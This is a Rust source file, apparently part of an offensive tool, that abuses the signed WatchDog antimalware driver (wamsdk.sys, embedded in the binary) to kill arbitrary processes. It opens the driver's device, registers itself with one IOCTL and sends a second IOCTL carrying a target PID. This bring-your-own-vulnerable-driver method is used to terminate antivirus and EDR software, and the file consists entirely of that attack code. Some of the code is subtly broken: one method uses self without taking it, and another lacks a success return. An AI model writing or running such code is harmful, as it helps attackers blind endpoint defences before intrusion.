use std::{mem, ptr::null_mut};

use winapi::{
    ctypes::c_void, shared::minwindef::{DWORD, LPVOID}, um::{
        fileapi::{CreateFileW, OPEN_EXISTING}, handleapi::{CloseHandle, INVALID_HANDLE_VALUE}, ioapiset::DeviceIoControl, processthreadsapi::GetCurrentProcessId, winnt::{FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_SHARE_WRITE, GENERIC_READ, GENERIC_WRITE}
    }
};

use crate::{
    trace, 
    drivers::KillerDriver, 
    utils::{error::SigurdError, to_wstring}
};

const DRIVER_NAME: &str = "wamsdk";
const VERSION: &str = "0.0.1";

const DRIVER_DEVICE: &str = "\\\\.\\amsdk";
const DRIVER_GUARD_DEVICE: &str = "\\\\.\\B5A6B7C9-1E31-4E62-91CB-6078ED1E9A4F";
const IOCTL_REGISTER: u32 = 0x80002010;
const IOCTL_KILL: u32 = 0x80002048;

static DRIVER: &'static [u8] = include_bytes!("../../../drivers/wamsdk.sys");

#[repr(C, packed)]
struct payload {
    pid: DWORD, 
    wait_for_exit: DWORD
}

impl payload {
    fn new(pid: DWORD) -> Self {
        Self { 
            pid, 
            wait_for_exit: 0 as DWORD 
        }
    }
}

pub struct Wamsdk {
    device: *mut c_void,
    current_pid: DWORD
}

impl Wamsdk {
    fn register() -> Result<bool, SigurdError> {
        let mut bytes = 0u32;
        let success = DeviceIoControl(
            self.device, 
            IOCTL_REGISTER, 
            &self.current_pid as *const _ as *mut _, 
            4, 
            null_mut(),                     
            0, 
            &mut bytes, 
            null_mut(),
        );
        
        if success != 0 {
            trace!("Registred current process");
            return Ok(true);
        } else {
            return Err(SigurdError::last("Failed to register current process"));
        }
    }
}

impl KillerDriver for Wamsdk {
    fn new() -> Result<Box<dyn KillerDriver>, SigurdError> where Self: Sized + 'static {
        return Ok(Box::new(Self { device: 0 as *mut c_void, current_pid: 0 }));
    }

    fn init(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            // Open Wamsdk driver
            let mut handle = CreateFileW(
                to_wstring(DRIVER_DEVICE).as_ptr(), 
                GENERIC_READ | GENERIC_WRITE, 
                FILE_SHARE_READ | FILE_SHARE_WRITE, 
                null_mut(), 
                OPEN_EXISTING, 
                FILE_ATTRIBUTE_NORMAL,
                null_mut(),
            );

            if handle == INVALID_HANDLE_VALUE { 
                handle = CreateFileW(
                    to_wstring(DRIVER_GUARD_DEVICE).as_ptr(), 
                    GENERIC_READ | GENERIC_WRITE, 
                    FILE_SHARE_READ | FILE_SHARE_WRITE, 
                    null_mut(), 
                    OPEN_EXISTING, 
                    FILE_ATTRIBUTE_NORMAL,
                    null_mut(),
                );
                
                if handle == INVALID_HANDLE_VALUE {
                    return Err(SigurdError::last("Can't get dervice handle"));
                }
            }

            trace!("Got device handle");
            self.device = handle;
            self.current_pid = GetCurrentProcessId();

            // Register current process
            self.register()?;
        }
    }

    fn destruct(&mut self) -> Result<bool, SigurdError> {
        unsafe {
            match CloseHandle(self.device) {
                0 => {
                    return Err(SigurdError::last("Can't close device handle"));
                }
                _ => {
                    trace!("Closed device handle");
                    return Ok(true);
                }
            }
        }
    }

    fn name(&self) -> &'static str {
        return DRIVER_NAME;
    }

    fn version(&self) -> &'static str {
        return VERSION;
    }

    fn description(&self) -> &'static str {
        return "A WatchDog Antimalware Driver";
    }

    fn get_file(&self) -> Result<Vec<u8>, crate::utils::error::SigurdError> {
        let v = DRIVER.to_vec();
        return Ok(v);
    }

    fn kill(&mut self, pid: u32) -> Result<(), crate::utils::error::SigurdError> {
        unsafe {    
            let mut input = payload::new(pid);

            let mut out = 0u32;
            let mut bytes = 0u32;
            let success = DeviceIoControl(
                self.device, 
                IOCTL_KILL, 
                &mut input as *mut _ as LPVOID, 
                mem::size_of::<payload>() as DWORD, 
                &mut out as *mut _ as *mut _, 
                4, 
                &mut bytes, 
                null_mut(),
            );
            
            if success != 0 {
                trace!("IOCTRL request send {}", IOCTL_KILL);
                return Ok(());
            } else {
                return Err(SigurdError::last("Failed to kill the process"));
            }
        }
    }
}
